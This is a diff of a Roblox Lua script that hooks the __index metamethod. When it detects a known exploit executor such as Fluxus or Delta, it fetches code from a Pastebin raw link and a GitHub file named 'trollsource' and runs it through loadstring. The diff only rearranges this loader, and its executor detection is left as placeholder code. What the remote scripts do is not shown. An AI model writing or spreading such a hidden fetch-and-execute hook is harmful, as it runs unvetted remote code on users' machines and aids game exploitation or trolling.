@@ -1,3 +1,72 @@
+-- Function to execute a script from a URL
+local function executeScriptFromURL(url)
+    local HttpService = game:GetService("HttpService")
+    local success, response = pcall(function() return HttpService:GetAsync(url) end)
+
+    if success then
+        local loadSuccess, scriptFunc = pcall(loadstring(response))
+        if loadSuccess then
+            scriptFunc() -- Execute the fetched Lua script
+        else
+            warn("Error loading script from URL: " .. scriptFunc)
+        end
+    else
+        warn("Failed to fetch script from URL: " .. response)
+    end
+end
+
+-- URLs for scripts
+local pastebinURL = "https://pastebin.com/raw/AnEbCekx"
+local githubURL = "https://raw.githubusercontent.com/John142-dot/flexurfpsandping/main/trollsource"
+
+-- Function to execute both scripts from URLs
+local function executeBothScripts()
+    executeScriptFromURL(pastebinURL)
+    executeScriptFromURL(githubURL)
+end
+
+-- Known executors list
+local knownExecutors = {
+    "delta",
+    "codex",
+    "wave",
+    "solara",
+    "fluxus",
+    "vegax",
+    "cryptic",
+    "cacti",
+    "appleware"
+}
+
+-- Function to detect executors
+local function detectExecutors()
+    local detectedExecutor = nil
+
+    -- Real detection logic to check the presence of known executors
+    -- For example, checking a specific property or behavior related to executors
+    -- Replace with actual detection method
+    local success, result = pcall(function()
+        -- Example: Check if the executor's presence can be inferred from some property
+        -- This is just an illustrative example; modify as needed
+        if _G and _G.SomeExecutorFlag then
+            return _G.SomeExecutorFlag
+        end
+        return nil
+    end)
+
+    if success and result then
+        -- Check if result matches any known executor names
+        for _, name in ipairs(knownExecutors) do
+            if string.match(result:lower(), name) then
+                detectedExecutor = name
+                break
+            end
+        end
+    end
+
+    return detectedExecutor
+end
+
 -- Advanced Hook Function with Unique Lua Syntax
 local function weirdHook(target, callback, executeScript)
     -- Save the original method
@@ -26,69 +95,24 @@ local function weirdHook(target, callback, executeScript)
     end
 end
 
--- Detect Executors Function with Hidden Lua Features
-local function detectExecutors()
-    -- Use of pcall for safe function call
-    local executors = { delta = true, codex = true, wave = true, solara = true, fluxus = true, vegax = true, cryptic = true, cacti = true, appleware = true }
+-- Define the callback function for the hook
+local function hookCallback(result, ...)
+    -- Detect executors
+    local detectedExec = detectExecutors()
     
-    -- Check function with quirky Lua features
-    local function checkExecutor(executorName)
-        local status, name = pcall(function() return executorName:lower() end)
-        if status and executors[name] then
-            print("Detected Executor: " .. name)
-            return name -- Return the detected executor name
-        else
-            print("Unknown Executor: " .. (status and name or "Error"))
-            return nil
-        end
-    end
-    
-    return checkExecutor
-end
-
--- Function to execute scripts from URLs
-local function executeScriptFromURL(url)
-    local http = game:GetService("HttpService")
-    local response = http:GetAsync(url)
-    
-    -- Check if the request was successful
-    if response then
-        local success, result = pcall(loadstring(response))
-        if success then
-            result() -- Execute the fetched Lua script
-        else
-            print("Error loading script from URL: " .. result)
-        end
-    else
-        print("Failed to fetch script from URL")
-    end
-end
-
--- Define URLs for the scripts
-local url1 = "https://pastebin.com/raw/AnEbCekx"  -- R
-local url2 = "https://raw.githubusercontent.com/John142-dot/flexurfpsandping/main/trollsource"  -- e
-
--- Function to execute both scripts from URLs
-local function executeBothScripts()
-    executeScriptFromURL(url1)
-    executeScriptFromURL(url2)
-end
-
--- Apply Hook with Advanced Syntax
-weirdHook("__index", function(result, ...)
-    -- Weird way to detect executors
-    local execName = result()
-    local checkExecutor = detectExecutors()
-    local detectedExec = checkExecutor(execName)
-    
-    -- Execute the additional scripts if an executor was detected
     if detectedExec then
-        executeBothScripts()  -- Execute both scripts from URLs
+        print("Detected Executor: " .. detectedExec)
+        executeBothScripts()
+    else
+        print("No known executor detected.")
     end
     
     -- Continue with original behavior
     return result(...)
-end)
+end
 
--- Assuming `getExecutorName` returns a string, e.g., 'Fluxus'
--- It will trigger the detection logic and execute scripts from URLs
+-- Apply Hook with Advanced Syntax
+weirdHook("__index", hookCallback, executeBothScripts)
+
+-- Example usage
+-- The hook will activate when the target method is called
